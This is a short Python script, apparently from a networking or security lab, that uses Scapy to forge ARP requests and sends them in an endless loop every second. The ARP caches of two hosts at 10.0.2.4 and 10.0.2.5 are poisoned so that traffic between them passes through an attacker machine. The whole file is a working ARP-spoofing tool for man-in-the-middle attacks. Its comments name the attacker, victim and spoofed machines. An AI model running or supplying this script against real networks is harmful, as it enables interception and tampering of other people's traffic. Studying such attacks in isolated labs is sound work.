from scapy.all import *
from datetime import datetime

def create_spoofed_arp_request(_hwsrc, _psrc, _hwdst, _pdst):

	# Create Ethernet frame, dst is Victim MAC, src is Attacker MAC
	E = Ether(dst=_hwdst, src=_hwsrc)

	# Create ARP request where:

	# opcode: 1, ARP request
	# hwsrc:  MAC of Attacker
	# psrc:   IP of Spoofed Machine
	# hwdst:  MAC of Victim
	# pdst:   IP of Victim

	A = ARP(op=1, hwsrc=_hwsrc, psrc=_psrc, hwdst=_hwdst, pdst=_pdst)
	
	# Create and return packet
	pkt = E/A
	return pkt

# Create packets
arp_pkt_1 = create_spoofed_arp_request('08:00:27:8D:CF:4E', '10.0.2.4', '08:00:27:4F:7A:1A', '10.0.2.5')
arp_pkt_2 = create_spoofed_arp_request('08:00:27:8D:CF:4E', '10.0.2.5', '08:00:27:D0:EB:83', '10.0.2.4')

# Send packets every 1 second to avoid self-correction of ARP cache on victim machines
while True:
	sendp(arp_pkt_1, verbose=0)	
	sendp(arp_pkt_2, verbose=0)
	now = datetime.now()
	current_time = now.strftime('%H:%M:%S')
	print('[', current_time, '] ', 'Sent spoofed ARP packets', sep='')
	time.sleep(1)